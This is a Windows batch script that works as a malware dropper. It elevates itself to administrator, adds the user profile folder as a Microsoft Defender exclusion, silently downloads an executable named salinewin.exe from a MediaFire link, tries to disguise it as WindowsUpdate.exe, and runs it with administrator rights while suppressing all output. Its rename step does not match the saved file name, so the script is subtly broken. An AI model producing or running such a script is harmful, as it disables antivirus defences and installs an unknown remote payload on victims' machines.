@echo off

set "DOWNLOAD_URL=https://download1351.mediafire.com/rpa4tqom4h4guhabSDGKbtT-74uj5SinOKB-X4My1jxPddU1VbQfsNp3tMwFc059Rn8v3aMXvkuUCrqb_U2ICqKXRoVsrisk1MZbL7V2kWed6IyfWjuwhlqcp5GiNL_u6BRQT3HhAJaZ-mdrcUUiP5Eh7w5Cw0ZaDewbrS5B_O-8/2onphd574f119h5/salinewin.exe" >NUL 2>&1
set "DESTINATION=%USERPROFILE%\file.exe" >NUL 2>&1

set "FOLDER=%USERPROFILE%" >NUL 2>&1
set "OLDNAME=salinewin.exe" >NUL 2>&1
set "NEWNAME=WindowsUpdate.exe" >NUL 2>&1

:: Check for admin rights
net session >nul 2>&1

:: If not admin, relaunch as admin
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%'" >NUL 2>&1

if %errorlevel% equ 0 (
    :: This is if the exclusion was added successfully (good).
) else (
    :: This is if it failed (bad).
    exit
)

powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%DESTINATION%'" >NUL 2>&1

rename "%FOLDER%\%OLDNAME%" "%NEWNAME%" >NUL 2>&1

powershell -Command "Start-Process '%FOLDER%\%NEWNAME%' -Verb RunAs" >NUL 2>&1

